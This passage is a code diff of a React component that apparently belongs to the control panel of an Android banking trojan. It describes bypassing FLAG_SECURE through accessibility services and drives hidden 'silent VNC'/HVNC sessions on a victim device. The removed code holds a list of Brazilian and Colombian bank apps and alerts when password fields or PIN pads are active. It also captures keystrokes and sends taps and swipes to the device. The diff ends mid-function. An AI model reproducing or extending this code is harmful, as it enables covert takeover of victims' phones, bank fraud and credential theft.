@@ -1,1019 +1,636 @@
-import { useEffect, useRef, useState, useCallback, useMemo } from 'react';
-import useStore from '../../store/index.js';
-import { ws } from '../../ws.js';
+/**
+ * ScreenReaderV2.jsx
+ *
+ * Renders the Android AccessibilityNodeInfo tree as an interactive canvas.
+ *
+ * WHY IT EXISTS:
+ *   Normal VNC (MediaProjection / takeScreenshot) honours FLAG_SECURE → black
+ *   frames on banking apps, payment screens, lock screens, and password fields.
+ *   Android's AccessibilityService.getRootInActiveWindow() is MANDATED to work
+ *   for TalkBack on every window — FLAG_SECURE has no effect on node info.
+ *
+ *   This component:
+ *     1. Receives the JSON node tree from the device (~3-15 KB vs ~150 KB JPEG)
+ *     2. Draws each node as a typed, coloured rectangle on a canvas
+ *     3. Maps canvas clicks → node.performAction(ACTION_CLICK) via accessibility
+ *     4. Maps keyboard → node.performAction(ACTION_SET_TEXT) on focused editable
+ *     5. Maps mouse wheel → ACTION_SCROLL_FORWARD/BACKWARD on scrollable nodes
+ *     6. Provides global actions (HOME/BACK/RECENTS) via GLOBAL_ACTION_* API
+ *
+ *   Result: full interactive screen control on FLAG_SECURE windows at 30-60 fps
+ *   with no pixel streaming, no JPEG, no MediaProjection, no FLAG_SECURE blocks.
+ */
 
-// ── Constants ──────────────────────────────────────────────────────────────────
-// VNC frame resolution the APK encodes at (SILENT_WIDTH × SILENT_HEIGHT)
-const VNC_W = 350;
-const VNC_H = 650;
+import { useEffect, useRef, useState, useCallback } from 'react'
+import { useDeviceStore, useWSStore } from '@/store'
+import { ws } from '@/utils/ws'
+import { C } from '@/utils/commands'
+import { Play, Square, RefreshCw, Home, ChevronLeft, List, Bell, Settings, Keyboard, MousePointer, Move, AlignLeft } from 'lucide-react'
+import clsx from 'clsx'
 
-// If no VNC frame arrives within this window → switch to wireframe-only render
-const VNC_STALE_MS = 3500;
+// ──────────────────────────────────────────────────────────────
+// NODE CLASSIFICATION
+// ──────────────────────────────────────────────────────────────
 
-// Hierarchy auto-poll interval (ms)
-const POLL_MS = 350;
-
-// Banking packages → FLAG_SECURE note (VNC still captures them via AccessibilityService.takeScreenshot)
-const BANK_PKGS = new Set([
-  'com.nu.production','com.itau','com.bradesco','com.santander.app',
-  'br.com.bb.android','br.com.caixa.tem','br.com.gabba.caixa',
-  'com.c6bank.app','br.com.intermedium','com.picpay',
-  'com.mercadopago.wallet','br.com.original.bank',
-  'com.btgpactual.banking','br.com.sicoob.bank','br.com.sicredi.app',
-  'com.davivienda.mobile','com.daviplata','com.bancolombia','com.nequi',
-]);
-const isBank = pkg => {
-  if (!pkg) return false;
-  if (BANK_PKGS.has(pkg)) return true;
-  const p = pkg.toLowerCase();
-  return ['bank','banco','itau','bradesco','santander','nubank','caixa',
-          'inter','picpay','neon','c6bank','davivienda','bancolombia'].some(k => p.includes(k));
-};
-
-// ── Parse hierarchy wire format ────────────────────────────────────────────────
-function parseHierarchy(dataStr) {
-  try {
-    const d = typeof dataStr === 'string' ? JSON.parse(dataStr) : dataStr;
-    const root = d.hierarchy;
-    const sw = root?.bounds?.w || 1080;
-    const sh = root?.bounds?.h || 2340;
-    const nodes = [];
-    walkNode(root, nodes, 0);
-    return { pkg: d.package || '', nodes, sw, sh, ts: d.timestamp || '' };
-  } catch (_) {
-    return { pkg: '', nodes: [], sw: 1080, sh: 2340, ts: '' };
-  }
+function nodeClass(cls = '') {
+  const c = cls.toLowerCase()
+  if (c.includes('edittext') || c.includes('autocomplete')) return 'edit'
+  if (c.includes('button') || c.includes('chip') || c.includes('fab'))  return 'button'
+  if (c.includes('checkbox') || c.includes('switch') || c.includes('toggle')) return 'check'
+  if (c.includes('imageview') || c.includes('imagebutton')) return 'image'
+  if (c.includes('recyclerview') || c.includes('listview') || c.includes('scrollview') || c.includes('nestedscroll')) return 'scroll'
+  if (c.includes('textview') || c.includes('text')) return 'text'
+  if (c.includes('viewgroup') || c.includes('framelayout') || c.includes('linearlayout') ||
+      c.includes('relativelayout') || c.includes('constraintlayout') || c.includes('coordinatorlayout')) return 'container'
+  return 'generic'
 }
 
-function walkNode(node, out, depth) {
-  if (!node || depth > 25) return;
-  const b = node.bounds;
-  const hasContent =
-    (node.text && node.text.trim()) ||
-    (node.desc && node.desc.trim()) ||
-    (node.hint && node.hint.trim()) ||
-    (b && b.w > 2 && b.h > 2);
+// ──────────────────────────────────────────────────────────────
+// CANVAS DRAWING
+// ──────────────────────────────────────────────────────────────
 
-  if (hasContent) {
-    out.push({
-      text:          (node.text || node.desc || node.hint || node.tooltip || '').trim(),
-      cls:           node.class || '',
-      id:            node.id || '',
-      clickable:     !!node.clickable,
-      editable:      !!node.editable,
-      password:      !!node.password,
-      checked:       !!node.checked,
-      enabled:       node.enabled !== false,
-      focused:       !!node.focused,
-      scrollable:    !!node.scrollable,
-      longClick:     !!node.longClickable,
-      selected:      !!node.selected,
-      isLockEl:      !!node.isLockElement,
-      isPinDigit:    !!node.isPinDigit,
-      isPatternLock: !!node.isPatternLock,
-      isSwipeUnlock: !!node.isSwipeUnlock,
-      isKeyboardKey: !!node.isKeyboardKey,
-      keyType:       node.keyType || '',
-      patternGrid:   node.patternGrid || null,
-      swipeHint:     node.swipeHint || null,
-      windowType:    node.windowType || 0,
-      isLockScreen:  !!node.isLockScreen,
-      bounds:        b ? { x: b.x||0, y: b.y||0, w: b.w||0, h: b.h||0 } : null,
-      depth,
-    });
-  }
-  const children = node.children || [];
-  for (let i = 0; i < children.length; i++) walkNode(children[i], out, depth + 1);
+const COLORS = {
+  edit:      { fill: 'rgba(59,130,246,0.18)',  stroke: '#3b82f6',  text: '#93c5fd' },
+  button:    { fill: 'rgba(212,160,23,0.18)',  stroke: '#d4a017',  text: '#fcd34d' },
+  check:     { fill: 'rgba(20,184,166,0.15)',  stroke: '#14b8a6',  text: '#5eead4' },
+  image:     { fill: 'rgba(100,100,120,0.10)', stroke: '#6b7280',  text: '#9ca3af' },
+  scroll:    { fill: 'rgba(0,0,0,0)',          stroke: '#374151',  text: '#6b7280' },
+  text:      { fill: 'rgba(0,0,0,0)',          stroke: 'transparent', text: 'rgba(255,255,255,0.75)' },
+  container: { fill: 'rgba(0,0,0,0)',          stroke: 'rgba(55,65,81,0.4)', text: '' },
+  generic:   { fill: 'rgba(0,0,0,0)',          stroke: 'rgba(55,65,81,0.3)', text: '' },
 }
 
-// ── Node visual classification ─────────────────────────────────────────────────
-function nodeStyle(n) {
-  if (n.password)      return { fill: 'rgba(255,40,90,0.28)',  stroke: '#FF2A5A', lw: 2.5 };
-  if (n.focused)       return { fill: 'rgba(0,240,140,0.22)',  stroke: '#00F08C', lw: 2.5 };
-  if (n.editable)      return { fill: 'rgba(255,210,0,0.22)',  stroke: '#FFD200', lw: 2   };
-  if (n.isPinDigit)    return { fill: 'rgba(255,140,0,0.35)',  stroke: '#FF8C00', lw: 2.5 };
-  if (n.isPatternLock) return { fill: 'rgba(200,80,255,0.25)', stroke: '#C850FF', lw: 2   };
-  if (n.isLockScreen)  return { fill: 'rgba(255,50,50,0.15)',  stroke: '#FF3232', lw: 1.5 };
-  if (n.isKeyboardKey) return { fill: 'rgba(50,220,80,0.30)',  stroke: '#32DC50', lw: 1.5 };
-  if (n.scrollable)    return { fill: 'rgba(0,200,255,0.12)',  stroke: '#00C8FF', lw: 1.5 };
-  if (n.clickable)     return { fill: 'rgba(60,130,255,0.22)', stroke: '#3C82FF', lw: 1.5 };
-  if (n.checked)       return { fill: 'rgba(0,255,180,0.20)',  stroke: '#00FFB4', lw: 1.5 };
-  if (n.text)          return { fill: 'rgba(180,180,180,0.07)',stroke: 'rgba(180,180,180,0.4)', lw: 1 };
-  return                      { fill: 'rgba(80,80,100,0.05)',  stroke: 'rgba(100,100,120,0.25)', lw: 0.5 };
-}
+function drawNodes(ctx, nodes, sw, sh, cw, ch, hoveredId, selectedId) {
+  const sx = cw / sw
+  const sy = ch / sh
 
-// ── Draw all nodes on an overlay canvas ───────────────────────────────────────
-function drawNodeOverlay(ctx, nodes, sw, sh, cw, ch, hover) {
-  ctx.clearRect(0, 0, cw, ch);
-  const scaleX = cw / sw;
-  const scaleY = ch / sh;
+  // Sort: containers first (back), leaves last (front)
+  const sorted = [...nodes].sort((a, b) => (a.depth ?? 0) - (b.depth ?? 0))
 
-  // Draw back-to-front so smaller (interactive) nodes appear on top
-  const sorted = [...nodes].sort((a, b) => {
-    const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
-    const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
-    return areaB - areaA; // larger first (drawn first = underneath)
-  });
+  ctx.save()
+  ctx.font = '11px "JetBrains Mono", monospace'
+  ctx.textBaseline = 'middle'
 
-  for (const n of sorted) {
-    const b = n.bounds;
-    if (!b || b.w < 3 || b.h < 3) continue;
-    const x = b.x * scaleX;
-    const y = b.y * scaleY;
-    const w = b.w * scaleX;
-    const h = b.h * scaleY;
-    const s = nodeStyle(n);
+  for (const node of sorted) {
+    const [l, t, r, b] = node.b || [0, 0, 0, 0]
+    const x = l * sx, y = t * sy, w = (r - l) * sx, h = (b - t) * sy
+    if (w < 2 || h < 2) continue
 
-    ctx.save();
-    const r = Math.min(6, w * 0.1, h * 0.1);
-    ctx.beginPath();
-    ctx.moveTo(x + r, y);
-    ctx.lineTo(x + w - r, y);
-    ctx.quadraticCurveTo(x + w, y, x + w, y + r);
-    ctx.lineTo(x + w, y + h - r);
-    ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
-    ctx.lineTo(x + r, y + h);
-    ctx.quadraticCurveTo(x, y + h, x, y + h - r);
-    ctx.lineTo(x, y + r);
-    ctx.quadraticCurveTo(x, y, x + r, y);
-    ctx.closePath();
-    ctx.fillStyle   = s.fill;
-    ctx.fill();
-    ctx.strokeStyle = s.stroke;
-    ctx.lineWidth   = s.lw;
-    ctx.stroke();
+    const type  = node.clickable && !node.edit ? (nodeClass(node.cls) === 'check' ? 'check' : 'button') : nodeClass(node.cls)
+    const color = COLORS[type] || COLORS.generic
+    const isFocused  = node.focus
+    const isHovered  = node.id === hoveredId
+    const isSelected = node.id === selectedId
 
-    // Label for meaningful nodes
-    if (n.text && w > 30 && h > 12) {
-      const maxFontSz = Math.min(11, h * 0.38, w * 0.14);
-      const fontSize  = Math.max(6, maxFontSz);
-      ctx.font        = `${fontSize}px "SF Mono", "Consolas", monospace`;
-      ctx.fillStyle   = n.password ? '#FF6080' : n.editable ? '#FFE060' :
-                        n.focused  ? '#00FF9A' : n.clickable ? '#90C0FF' : '#C8C8D8';
-      ctx.globalAlpha = 0.92;
-      const label = n.text.slice(0, 28);
-      ctx.fillText(label, x + 3, y + fontSize + 2);
-      ctx.globalAlpha = 1;
+    // Fill
+    if (color.fill !== 'rgba(0,0,0,0)') {
+      ctx.fillStyle = isHovered ? color.fill.replace(/[\d.]+\)$/, '0.35)') : color.fill
+      ctx.fillRect(x, y, w, h)
     }
 
-    // Hover highlight
-    if (hover && hover === n) {
-      ctx.strokeStyle = '#FFFFFF';
-      ctx.lineWidth   = 2.5;
-      ctx.setLineDash([4, 3]);
-      ctx.stroke();
-      ctx.setLineDash([]);
+    // Focused glow
+    if (isFocused) {
+      ctx.shadowColor = '#22d36e'
+      ctx.shadowBlur  = 10
+    }
+    if (isSelected) {
+      ctx.shadowColor = '#f59e0b'
+      ctx.shadowBlur  = 8
     }
 
-    // Pattern grid dots
-    if (n.patternGrid) {
-      for (const pt of n.patternGrid) {
-        const px = pt.x * scaleX;
-        const py = pt.y * scaleY;
-        const pr = Math.max(4, (pt.r || 6) * Math.min(scaleX, scaleY));
-        ctx.beginPath();
-        ctx.arc(px, py, pr, 0, Math.PI * 2);
-        ctx.fillStyle   = 'rgba(200,80,255,0.7)';
-        ctx.fill();
-        ctx.strokeStyle = '#C850FF';
-        ctx.lineWidth   = 1.5;
-        ctx.stroke();
+    // Stroke
+    if (color.stroke !== 'transparent') {
+      ctx.strokeStyle = isHovered  ? '#f5c842'
+                      : isSelected ? '#f59e0b'
+                      : isFocused  ? '#22d36e'
+                      : color.stroke
+
+      if (type === 'scroll') {
+        ctx.setLineDash([4, 3])
+        ctx.lineWidth = 0.8
+      } else {
+        ctx.setLineDash([])
+        ctx.lineWidth = isHovered || isFocused || isSelected ? 1.5 : 0.8
       }
-    }
-    ctx.restore();
-  }
-}
-
-// ── Draw wireframe (no VNC) full synthetic screen ─────────────────────────────
-function drawWireframe(ctx, nodes, sw, sh, cw, ch) {
-  // Dark background simulating phone screen
-  ctx.fillStyle = '#0D0D12';
-  ctx.fillRect(0, 0, cw, ch);
-
-  // Status bar
-  ctx.fillStyle = 'rgba(30,32,45,0.9)';
-  ctx.fillRect(0, 0, cw, ch * (24 / sh));
-
-  // Grid lines (subtle)
-  ctx.strokeStyle = 'rgba(60,65,90,0.3)';
-  ctx.lineWidth   = 0.5;
-  for (let gx = 0; gx < cw; gx += cw / 12) {
-    ctx.beginPath(); ctx.moveTo(gx, 0); ctx.lineTo(gx, ch); ctx.stroke();
-  }
-  for (let gy = 0; gy < ch; gy += ch / 22) {
-    ctx.beginPath(); ctx.moveTo(0, gy); ctx.lineTo(cw, gy); ctx.stroke();
-  }
-
-  // Nodes as full-fill wireframe elements
-  const scaleX = cw / sw;
-  const scaleY = ch / sh;
-  const sorted = [...nodes].sort((a, b) => {
-    const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
-    const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
-    return areaB - areaA;
-  });
-
-  for (const n of sorted) {
-    const b = n.bounds;
-    if (!b || b.w < 3 || b.h < 3) continue;
-    const x = b.x * scaleX;
-    const y = b.y * scaleY;
-    const w = b.w * scaleX;
-    const h = b.h * scaleY;
-    const s = nodeStyle(n);
-
-    ctx.save();
-    const r = Math.min(8, w * 0.12, h * 0.12);
-    ctx.beginPath();
-    ctx.moveTo(x + r, y);
-    ctx.lineTo(x + w - r, y);
-    ctx.quadraticCurveTo(x + w, y, x + w, y + r);
-    ctx.lineTo(x + w, y + h - r);
-    ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
-    ctx.lineTo(x + r, y + h);
-    ctx.quadraticCurveTo(x, y + h, x, y + h - r);
-    ctx.lineTo(x, y + r);
-    ctx.quadraticCurveTo(x, y, x + r, y);
-    ctx.closePath();
-
-    // Stronger fill in wireframe mode since there's no VNC background
-    const fillStr = s.fill.replace(/[\d.]+\)$/, v => String(Math.min(0.85, parseFloat(v) * 2.8)) + ')');
-    ctx.fillStyle   = fillStr;
-    ctx.fill();
-    ctx.strokeStyle = s.stroke;
-    ctx.lineWidth   = Math.max(1, s.lw);
-    ctx.stroke();
-
-    // Text label
-    if (n.text && w > 20 && h > 10) {
-      const fontSize = Math.max(7, Math.min(12, h * 0.4, w * 0.13));
-      ctx.font        = `${n.clickable || n.editable ? '600' : '400'} ${fontSize}px -apple-system, sans-serif`;
-      ctx.fillStyle   = n.password ? '#FF6080' : n.editable ? '#FFE060' :
-                        n.focused  ? '#00FF9A' : n.clickable ? '#9DC8FF' : '#A8A8B8';
-      ctx.globalAlpha = 0.95;
-      const label = n.text.slice(0, Math.floor(w / (fontSize * 0.55)));
-      const tx = x + w / 2 - ctx.measureText(label).width / 2;
-      ctx.fillText(label, Math.max(x + 2, tx), y + h / 2 + fontSize * 0.35);
-      ctx.globalAlpha = 1;
+      ctx.strokeRect(x + 0.5, y + 0.5, w - 1, h - 1)
+      ctx.setLineDash([])
+      ctx.shadowColor = 'transparent'
+      ctx.shadowBlur  = 0
+    } else {
+      ctx.shadowColor = 'transparent'
+      ctx.shadowBlur  = 0
     }
 
-    ctx.restore();
-  }
-}
-
-// ── Hit-test: find the deepest smallest node at (cx, cy) in device coords ─────
-function hitTest(nodes, devX, devY) {
-  let best = null;
-  let bestArea = Infinity;
-  for (const n of nodes) {
-    const b = n.bounds;
-    if (!b) continue;
-    if (devX >= b.x && devX <= b.x + b.w && devY >= b.y && devY <= b.y + b.h) {
-      const area = b.w * b.h;
-      if (area < bestArea) { bestArea = area; best = n; }
-    }
-  }
-  return best;
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// COMPONENT
-// ─────────────────────────────────────────────────────────────────────────────
-export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
-  const device  = useStore(s => s.deviceDetail);
-  const setVnc  = useStore(s => s.setVncActive);
-  const d       = device || {};
-
-  // ── Canvas refs ─────────────────────────────────────────────────────────────
-  const vncCanvasRef     = useRef(null); // VNC JPEG frames
-  const overlayCanvasRef = useRef(null); // Node overlay (pointer-events: all)
-  const wfCanvasRef      = useRef(null); // Wireframe-only canvas (when no VNC)
-
-  // ── Stream state ────────────────────────────────────────────────────────────
-  const fpsRef        = useRef(0);
-  const hzRef         = useRef(0);
-  const lastVncFrameRef = useRef(0);      // timestamp of last VNC frame
-  const touchRef      = useRef(null);
-  const mouseRef      = useRef(null);
-
-  // ── React state ─────────────────────────────────────────────────────────────
-  const [mode,      setMode]      = useState('HVNC');  // HVNC | WIRE | EDITAR | DUPLO
-  const [vncOn,     setVncOn]     = useState(false);
-  const [srOn,      setSrOn]      = useState(false);
-  const [fps,       setFps]       = useState(0);
-  const [hz,        setHz]        = useState(0);
-  const [nodes,     setNodes]     = useState([]);
-  const [sw,        setSw]        = useState(1080);
-  const [sh,        setSh]        = useState(2340);
-  const [curPkg,    setCurPkg]    = useState('');
-  const [wireframe, setWireframe] = useState(false);  // true = no VNC frames coming
-  const [hover,     setHover]     = useState(null);
-  const [toast,     setToast]     = useState(null);
-  const [quality,   setQuality]   = useState(60);
-  const [kbCapture, setKbCapture] = useState(false);
-  const [typedBuf,  setTypedBuf]  = useState('');
-
-  // Local refs for latest render values (avoid stale closures)
-  const nodesRef  = useRef([]);
-  const swRef     = useRef(1080);
-  const shRef     = useRef(2340);
-  const hoverRef  = useRef(null);
-  const modeRef   = useRef('HVNC');
-
-  useEffect(() => { nodesRef.current = nodes; }, [nodes]);
-  useEffect(() => { swRef.current = sw; }, [sw]);
-  useEffect(() => { shRef.current = sh; }, [sh]);
-  useEffect(() => { hoverRef.current = hover; }, [hover]);
-  useEffect(() => { modeRef.current = mode; }, [mode]);
-
-  // ── VNC binary frame handler ─────────────────────────────────────────────────
-  useEffect(() => {
-    const unsub = ws.onBinary((buf, devId) => {
-      if (devId !== deviceId) return;
-      lastVncFrameRef.current = Date.now();
-      setWireframe(false);
-      fpsRef.current++;
-
-      const blob  = new Blob([buf], { type: 'image/jpeg' });
-      const url   = URL.createObjectURL(blob);
-      const img   = new Image();
-      img.onload  = () => {
-        const c = vncCanvasRef.current;
-        if (!c) { URL.revokeObjectURL(url); return; }
-        if (c.width  !== img.naturalWidth)  c.width  = img.naturalWidth;
-        if (c.height !== img.naturalHeight) c.height = img.naturalHeight;
-        c.getContext('2d').drawImage(img, 0, 0);
-        URL.revokeObjectURL(url);
-
-        // Sync overlay canvas dimensions to match VNC canvas display size
-        const oc = overlayCanvasRef.current;
-        if (oc) {
-          if (oc.width  !== c.width)  oc.width  = c.width;
-          if (oc.height !== c.height) oc.height = c.height;
-          redrawOverlay();
+    // Label — only render if node is big enough and has text
+    if (color.text && h > 10 && w > 20) {
+      const label = node.text || node.hint || node.desc || ''
+      if (label) {
+        ctx.fillStyle = color.text
+        ctx.font = h > 24 ? '11px "JetBrains Mono", monospace' : '9px "JetBrains Mono", monospace'
+        const maxW = w - 8
+        let display = label
+        // Truncate
+        while (display.length > 1 && ctx.measureText(display).width > maxW) {
+          display = display.slice(0, -1)
         }
-      };
-      img.src = url;
-    });
-
-    const fpsTick = setInterval(() => { setFps(fpsRef.current); fpsRef.current = 0; }, 1000);
-    const staleTick = setInterval(() => {
-      if (Date.now() - lastVncFrameRef.current > VNC_STALE_MS) setWireframe(true);
-    }, 1000);
-
-    return () => { unsub(); clearInterval(fpsTick); clearInterval(staleTick); };
-  }, [deviceId]);
-
-  // ── Hierarchy + status message handler ──────────────────────────────────────
-  useEffect(() => {
-    const unsub = ws.onMessage(msg => {
-      if (msg.device_id !== deviceId) return;
-
-      if (msg.type === 'screen_hierarchy' || msg.type === 'SCREEN_HIERARCHY') {
-        const { pkg, nodes: parsed, sw: w, sh: h } = parseHierarchy(msg.data);
-        setNodes(parsed);
-        setSw(w); setSh(h);
-        setCurPkg(pkg);
-        hzRef.current++;
-
-        if (parsed.some(n => n.password && n.focused)) showToast('🔑 CAMPO SENHA ATIVO');
-        if (parsed.some(n => n.isPinDigit))            showToast('🔢 PIN PAD DETECTADO');
+        if (display.length < label.length) display += '…'
+        ctx.fillText(display, x + 4, y + h / 2)
       }
-
-      if (msg.type === 'device_status') {
-        const pkg = msg.package || '';
-        setCurPkg(pkg);
-      }
-
-      if (msg.type === 'vnc_status' || msg.type === 'sr_v2_status') {
-        const active = !!msg.active;
-        setVncOn(active);
-        setVnc(active);
-        if (!active) lastVncFrameRef.current = 0;
-      }
-    });
-
-    const hzTick = setInterval(() => { setHz(hzRef.current); hzRef.current = 0; }, 1000);
-
-    return () => { unsub(); clearInterval(hzTick); };
-  }, [deviceId]);
-
-  // ── Auto-poll hierarchy ──────────────────────────────────────────────────────
-  useEffect(() => {
-    if (!srOn) return;
-    const t = setInterval(() => {
-      sendCmd('REQUEST_HIERARCHY');
-    }, POLL_MS);
-    return () => clearInterval(t);
-  }, [srOn, deviceId]);
-
-  // ── Keyboard capture ─────────────────────────────────────────────────────────
-  useEffect(() => {
-    if (!kbCapture) return;
-    const handler = (e) => {
-      // Navigation keys
-      if (e.key === 'Backspace') {
-        e.preventDefault();
-        sendCmd('TYPE', { text: '\b' });
-        return;
-      }
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        sendCmd('TYPE', { text: '\n' });
-        return;
-      }
-      // Ignore control keys
-      if (e.key.length > 1 || e.ctrlKey || e.metaKey || e.altKey) return;
-      e.preventDefault();
-      setTypedBuf(prev => {
-        const next = prev + e.key;
-        sendCmd('TYPE', { text: e.key });
-        return next.slice(-40);
-      });
-    };
-    window.addEventListener('keydown', handler);
-    return () => window.removeEventListener('keydown', handler);
-  }, [kbCapture, sendCmd]);
-
-  // ── Wireframe canvas render on node change ───────────────────────────────────
-  useEffect(() => {
-    if (!wireframe) return;
-    const c = wfCanvasRef.current;
-    if (!c) return;
-    drawWireframe(c.getContext('2d'), nodes, sw, sh, c.width, c.height);
-  }, [nodes, sw, sh, wireframe]);
-
-  // ── Overlay redraw helper ────────────────────────────────────────────────────
-  const redrawOverlay = useCallback(() => {
-    const oc = overlayCanvasRef.current;
-    if (!oc) return;
-    drawNodeOverlay(
-      oc.getContext('2d'),
-      nodesRef.current,
-      swRef.current,
-      shRef.current,
-      oc.width,
-      oc.height,
-      hoverRef.current,
-    );
-  }, []);
-
-  // Redraw overlay when nodes/hover change
-  useEffect(() => { redrawOverlay(); }, [nodes, hover, redrawOverlay]);
-
-  // ── Start / stop ─────────────────────────────────────────────────────────────
-  function startAll() {
-    ws.subscribe('vnc', deviceId);
-    sendCmd('START_SCREEN_READER_V2', { enabled: true, quality });
-    setVncOn(true); setVnc(true); setSrOn(true);
-    sendCmd('REQUEST_HIERARCHY');
-    lastVncFrameRef.current = Date.now();
-  }
-
-  function stopAll() {
-    ws.unsubscribe('vnc', deviceId);
-    sendCmd('STOP_SCREEN_READER_V2', { enabled: false });
-    // Fallback for APKs without START_SCREEN_READER_V2 command:
-    sendCmd('STOP_SILENT_VNC');
-    sendCmd('TOGGLE_SCREEN_READER', { enabled: false });
-    setVncOn(false); setVnc(false); setSrOn(false);
-    setKbCapture(false);
-    setTypedBuf('');
-  }
-
-  function startVncOnly() {
-    ws.subscribe('vnc', deviceId);
-    sendCmd('START_SILENT_VNC', { quality });
-    setVncOn(true); setVnc(true);
-    lastVncFrameRef.current = Date.now();
-  }
-
-  function startSrOnly() {
-    sendCmd('TOGGLE_SCREEN_READER', { enabled: true });
-    setSrOn(true);
-    sendCmd('REQUEST_HIERARCHY');
-  }
-
-  function setQualityAndSend(q) {
-    setQuality(q);
-    if (vncOn) sendCmd('SET_SILENT_VNC_QUALITY', { quality: q });
-  }
-
-  // ── Toast ────────────────────────────────────────────────────────────────────
-  function showToast(msg, ms = 2000) {
-    setToast(msg);
-    setTimeout(() => setToast(null), ms);
-  }
-
-  // ── Canvas coordinate helpers ────────────────────────────────────────────────
-  // Returns normalized (0–1) coords from a canvas pixel position
-  const toNorm = useCallback((px, py, canvasEl) => {
-    if (!canvasEl) return { x: 0, y: 0 };
-    const r = canvasEl.getBoundingClientRect();
-    return { x: (px - r.left) / r.width, y: (py - r.top) / r.height };
-  }, []);
-
-  // Returns device pixel coords from normalized coords
-  const normToDev = useCallback((nx, ny) => ({
-    x: Math.round(nx * swRef.current),
-    y: Math.round(ny * shRef.current),
-  }), []);
-
-  // ── Mouse / touch input on the canvas stack ──────────────────────────────────
-  const onPointerMove = useCallback((e) => {
-    const oc = overlayCanvasRef.current;
-    if (!oc) return;
-    const norm  = toNorm(e.clientX, e.clientY, oc);
-    const devPt = normToDev(norm.x, norm.y);
-    const hit   = hitTest(nodesRef.current, devPt.x, devPt.y);
-    if (hit !== hoverRef.current) setHover(hit);
-  }, [toNorm, normToDev]);
-
-  const onPointerDown = useCallback((e) => {
-    e.preventDefault();
-    const oc = overlayCanvasRef.current;
-    if (!oc) return;
-    const norm  = toNorm(e.clientX, e.clientY, oc);
-    mouseRef.current = { norm, ts: Date.now() };
-  }, [toNorm]);
-
-  const onPointerUp = useCallback((e) => {
-    e.preventDefault();
-    if (!mouseRef.current) return;
-    const oc  = overlayCanvasRef.current;
-    if (!oc)  return;
-    const end  = toNorm(e.clientX, e.clientY, oc);
-    const { norm: start, ts } = mouseRef.current;
-    mouseRef.current = null;
-    const dt   = Date.now() - ts;
-    const dx   = end.x - start.x;
-    const dy   = end.y - start.y;
-    const dist = Math.hypot(dx, dy);
-
-    if (dist < 0.015) {
-      // Tap — check if we hit an interactive node
-      const devPt = normToDev(start.x, start.y);
-      const hit   = hitTest(nodesRef.current, devPt.x, devPt.y);
-      if (hit && hit.clickable && hit.bounds) {
-        const cx = Math.round(hit.bounds.x + hit.bounds.w / 2);
-        const cy = Math.round(hit.bounds.y + hit.bounds.h / 2);
-        sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: cx, y: cy });
-        showToast(`${dt > 600 ? '⏱ HOLD' : '⚡ TAP'} → ${hit.text || hit.cls.split('.').pop() || '?'}`);
-      } else {
-        // No node hit — use normalized coords (works in both VNC and wireframe mode)
-        sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: start.x, y: start.y, scale: 'vnc_norm' });
-        showToast(`${dt > 600 ? '⏱ HOLD' : '⚡ TAP'} → (${(start.x * 100).toFixed(0)}%, ${(start.y * 100).toFixed(0)}%)`);
-      }
-    } else {
-      // Swipe
-      sendCmd('SWIPE', {
-        x1: start.x, y1: start.y,
-        x2: end.x,   y2: end.y,
-        duration: dt,
-        scale: 'vnc_norm',
-      });
-      showToast(`↕ SWIPE ${dt}ms`);
     }
-  }, [toNorm, normToDev, sendCmd]);
 
-  // Touch events (mobile)
-  const onTouchStart = useCallback((e) => {
-    e.preventDefault();
-    const t = e.touches[0];
-    const oc = overlayCanvasRef.current;
-    if (!oc) return;
-    touchRef.current = { norm: toNorm(t.clientX, t.clientY, oc), ts: Date.now() };
-  }, [toNorm]);
-
-  const onTouchEnd = useCallback((e) => {
-    e.preventDefault();
-    if (!touchRef.current) return;
-    const oc = overlayCanvasRef.current;
-    if (!oc) return;
-    const t   = e.changedTouches[0];
-    const end = toNorm(t.clientX, t.clientY, oc);
-    const { norm: start, ts } = touchRef.current;
-    touchRef.current = null;
-    const dt   = Date.now() - ts;
-    const dist = Math.hypot(end.x - start.x, end.y - start.y);
-
-    if (dist < 0.015) {
-      const devPt = normToDev(start.x, start.y);
-      const hit   = hitTest(nodesRef.current, devPt.x, devPt.y);
-      if (hit && hit.clickable && hit.bounds) {
-        const cx = Math.round(hit.bounds.x + hit.bounds.w / 2);
-        const cy = Math.round(hit.bounds.y + hit.bounds.h / 2);
-        sendCmd(dt > 500 ? 'LONG_PRESS' : 'TAP', { x: cx, y: cy });
-      } else {
-        sendCmd(dt > 500 ? 'LONG_PRESS' : 'TAP', { x: start.x, y: start.y, scale: 'vnc_norm' });
-      }
-    } else {
-      sendCmd('SWIPE', { x1: start.x, y1: start.y, x2: end.x, y2: end.y, duration: dt, scale: 'vnc_norm' });
+    // Editable indicator
+    if (type === 'edit') {
+      ctx.fillStyle = '#3b82f6'
+      ctx.fillRect(x, y, 3, h)
     }
-  }, [toNorm, normToDev, sendCmd]);
+  }
+  ctx.restore()
+}
 
-  // ── Navigation shortcuts ──────────────────────────────────────────────────────
-  const nav = useCallback((action) => {
-    sendCmd(action);
-    showToast(`▶ ${action}`);
-  }, [sendCmd]);
+// ──────────────────────────────────────────────────────────────
+// HIT-TEST
+// ──────────────────────────────────────────────────────────────
 
-  // ── Derived ──────────────────────────────────────────────────────────────────
-  const bankApp   = isBank(curPkg);
-  const showHvnc  = mode === 'HVNC'  || mode === 'DUPLO';
-  const showEdit  = mode === 'EDITAR' || mode === 'DUPLO';
-  const showWire  = mode === 'WIRE';
-  const activeMode = wireframe ? 'WIREFRAME' : (fps > 0 ? 'HVNC LIVE' : 'AGUARDANDO');
+function hitTest(nodes, dx, dy, requireClickable = true) {
+  // Walk from deepest (highest depth) upward to find the smallest node at point
+  const candidates = [...nodes]
+    .filter(n => {
+      if (!n.b) return false
+      const [l, t, r, b] = n.b
+      return dx >= l && dx <= r && dy >= t && dy <= b && n.en !== false
+    })
+    .sort((a, b) => (b.depth ?? 0) - (a.depth ?? 0))
 
-  const pwdNodes    = useMemo(() => nodes.filter(n => n.password),          [nodes]);
